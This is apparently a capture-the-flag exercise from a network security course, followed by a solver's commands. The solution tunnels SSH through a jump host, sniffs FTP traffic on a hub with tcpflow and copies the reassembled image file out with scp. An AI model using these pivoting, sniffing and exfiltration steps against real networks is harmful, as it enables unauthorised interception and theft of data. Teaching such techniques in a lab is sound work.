Sniffing a text flag is easy huh? 
Now you have all the tools installed but the flag is in an image! Note that:

Interface eth0 is connected to the Firewall through which you are penetrating.
Interface eth1 is connected to a hub.
An FTP client and server are also connected to the hub.
Use the command you want to sniff through your eth1 interface. 
Note that you will have to reconstruct the TCP flow and obtain a large file. 
You are advised to use tcpflow without console mode. 
As you cannot access the image locally 
you need to exfiltrate the file to view it locally on your computer.

Hint: base64 copy terminal contents 
and base64 -d (see attached file if this is not enough)

============================

ssh -i ~/.ssh/id_rsa_tunnelctf -l tunneluser -N -L 4001:10.107.1.21:22 35.233.20.31
ssh -p 4001 root@127.0.0.1

tcpflow -i eth1
ls 

Dans un autre terminal, 
scp -P 4001 root@127.0.0.1:./010.107.002.022.65108-010.107.002.021.48842 ./Documents/ITR302cybersecurite/challenges_reseau
